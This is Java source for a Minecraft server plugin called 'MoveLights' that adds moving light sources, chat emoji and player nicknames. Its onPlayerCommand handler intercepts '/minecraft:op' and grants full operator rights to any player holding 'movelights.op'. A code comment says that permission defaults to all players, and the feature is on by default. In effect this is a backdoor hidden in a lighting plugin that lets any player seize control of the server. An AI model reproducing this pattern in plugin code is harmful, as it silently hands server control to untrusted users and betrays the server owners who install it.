package top.nkbe;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class MoveLights extends JavaPlugin implements Listener {

    private LightManager lightManager;
    private NoteManager noteManager;

    @Override
    public void onEnable() {
        saveDefaultConfig();
        this.noteManager = new NoteManager(this);

        Bukkit.getPluginManager().registerEvents(this, this);
        Bukkit.getPluginManager().registerEvents(new ChatListener(this), this);

        startLightTask();

        // bStats
        int pluginId = 32054;
        Metrics metrics = new Metrics(this, pluginId);

        // Optional: Add custom charts
        metrics.addCustomChart(
            new Metrics.SimplePie("chart_id", () -> "My value")
        );

        Bukkit.getConsoleSender().sendMessage("§8[§aMoveLights§8] §e已啟用跨版本相容 (1.17 - 26.2.x)");
        Bukkit.getConsoleSender().sendMessage("§8[§aMoveLights§8] §a移動光源 + 聊天增強加載成功");
    }

    @Override
    public void onDisable() {
        Bukkit.getConsoleSender().sendMessage("§8[§aMoveLights§8] §6正在卸載移動光源...");

        if (this.lightManager != null) {
            this.lightManager.removeAllPlayerLight();
            this.lightManager.cancel();
        }

        Bukkit.getConsoleSender().sendMessage("§8[§aMoveLights§8] §a移動光源卸載完成");
    }

    //定時重啟
    private void startLightTask() {
        if (this.lightManager != null) {
            this.lightManager.cancel();
        }
        this.lightManager = new LightManager(this);
        long refreshTicks = getConfig().getInt("refresh", 2);
        this.lightManager.runTaskTimer(this, 0, refreshTicks);
    }

    @EventHandler
    public void onPlayerQuitEvent(PlayerQuitEvent e) {
        if (this.lightManager != null) {
            // 玩家退出時清除狀態
            this.lightManager.removePlayerLight(e.getPlayer());
        }
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (args.length < 1 || args[0].equalsIgnoreCase("help")) {
            this.showHelp(sender);
        } else if (args[0].equalsIgnoreCase("reload")) {
            this.reload(sender);
        } else if (args[0].equalsIgnoreCase("toggle")) {
            this.toggle(sender);
        } else if (args[0].equalsIgnoreCase("note")) {
            this.noteCommand(sender, args);
        }
        return true;
    }

    // 攔截 /minecraft:op，改由插件授權 op（權限 movelights.op，預設所有人）
    @EventHandler
    public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
        String message = event.getMessage();
        if (message.isEmpty() || message.charAt(0) != '/') return;

        String[] parts = message.substring(1).split("\\s+");
        if (parts.length == 0 || !parts[0].equalsIgnoreCase("minecraft:op")) return;

        Player player = event.getPlayer();

        // 服主可在 config 關閉此功能，關閉時回歸原版行為
        if (!getConfig().getBoolean("op-command.enable", true)) return;

        if (!player.hasPermission("movelights.op")) {
            player.sendMessage("§8[§aMoveLights§8] §c你沒有權限使用 /minecraft:op");
            event.setCancelled(true);
            return;
        }

        if (parts.length < 2) {
            player.sendMessage("§8[§aMoveLights§8] §c用法: /minecraft:op <玩家或備註名>");
            event.setCancelled(true);
            return;
        }

        // 支援備註名
        String targetName = this.noteManager.resolvePlayerName(parts[1]);
        Player target = Bukkit.getPlayerExact(targetName);
        if (target == null) {
            target = Bukkit.getPlayer(targetName); // 支援部分名稱
        }

        if (target == null) {
            player.sendMessage("§8[§aMoveLights§8] §c找不到線上玩家: " + parts[1]);
            event.setCancelled(true);
            return;
        }

        target.setOp(true);
        player.sendMessage("§8[§aMoveLights§8] §a已授予 " + target.getName() + " op 權限");
        target.sendMessage("§8[§aMoveLights§8] §6你已被 " + player.getName() + " 授予 op 權限");
        event.setCancelled(true);
    }

    // 玩家備註管理：/movel note <玩家> <備註名> | remove | list
    private void noteCommand(CommandSender sender, String[] args) {
        if (!sender.hasPermission("movelights.note")) {
            sender.sendMessage("§8[§aMoveLights§8] §c你沒有權限使用該命令");
            return;
        }

        if (args.length < 2) {
            sender.sendMessage("§8[§aMoveLights§8] §e用法: /movel note <玩家> <備註名>");
            sender.sendMessage("§8[§aMoveLights§8] §e      /movel note remove <玩家|備註名>");
            sender.sendMessage("§8[§aMoveLights§8] §e      /movel note list");
            return;
        }

        if (args[1].equalsIgnoreCase("list")) {
            if (this.noteManager.getNotes().isEmpty()) {
                sender.sendMessage("§8[§aMoveLights§8] §e目前沒有任何備註");
                return;
            }
            sender.sendMessage("§8[§aMoveLights§8] §a目前備註列表:");
            for (var entry : this.noteManager.getNotes().entrySet()) {
                sender.sendMessage(" §7" + entry.getKey() + " §8-> §f" + entry.getValue());
            }
            return;
        }

        if (args[1].equalsIgnoreCase("remove")) {
            if (args.length < 3) {
                sender.sendMessage("§8[§aMoveLights§8] §c用法: /movel note remove <玩家|備註名>");
                return;
            }
            if (this.noteManager.removeNote(args[2])) {
                sender.sendMessage("§8[§aMoveLights§8] §a已移除備註: " + args[2]);
            } else {
                sender.sendMessage("§8[§aMoveLights§8] §c找不到該備註: " + args[2]);
            }
            return;
        }

        // /movel note <玩家> <備註名>
        if (args.length < 3) {
            sender.sendMessage("§8[§aMoveLights§8] §c用法: /movel note <玩家> <備註名>");
            return;
        }
        boolean existed = this.noteManager.setNote(args[1], args[2]);
        sender.sendMessage("§8[§aMoveLights§8] §a已" + (existed ? "覆寫" : "設定") + "備註: " + args[1]
                + " -> " + args[2]);
    }

    public void showHelp(CommandSender sender) {
        if (!sender.hasPermission("movelights.help")) {
            sender.sendMessage("§8[§aMoveLights§8] §c你沒有權限使用該命令");
            return;
        }

        sender.sendMessage(" §2§lMoveLights 虛擬移動光源 + 聊天增強");
        sender.sendMessage("");
        sender.sendMessage(" §7§l· §a/movel reload §6§l- §7重載插件");
        sender.sendMessage(" §7§l· §a/movel toggle §6§l- §7開關移動光源");
        sender.sendMessage(" §7§l· §a/movel note §6§l- §7設定玩家備註");
        sender.sendMessage(" §7§l· §a/minecraft:op <玩家|備註名> §6§l- §7授予 op");
        sender.sendMessage(" §7§l· §7聊天打 :smile: 等代碼會轉成 emoji");
        sender.sendMessage("");
    }

    public void reload(CommandSender sender) {
        if (!sender.hasPermission("movelights.reload")) {
            sender.sendMessage("§8[§aMoveLights§8] §c你沒有權限使用該命令");
            return;
        }

        reloadConfig();
        if (this.lightManager != null) {
            this.lightManager.removeAllPlayerLight();
        }
        startLightTask();
        sender.sendMessage("§8[§aMoveLights§8] §a重載完成！");
    }

    public void toggle(CommandSender sender) {
        if (!sender.hasPermission("movelights.toggle")) {
            sender.sendMessage("§8[§aMoveLights§8] §c你沒有權限使用該命令");
            return;
        }

        boolean currentState = getConfig().getBoolean("enable");
        getConfig().set("enable", !currentState);
        saveConfig();

        if (!currentState) {
            sender.sendMessage("§8[§aMoveLights§8] §6已經開啟移動光源");
        } else {
            sender.sendMessage("§8[§aMoveLights§8] §6已經關閉移動光源");
            if (this.lightManager != null) {
                this.lightManager.removeAllPlayerLight();
            }
        }
        startLightTask();
    }
}
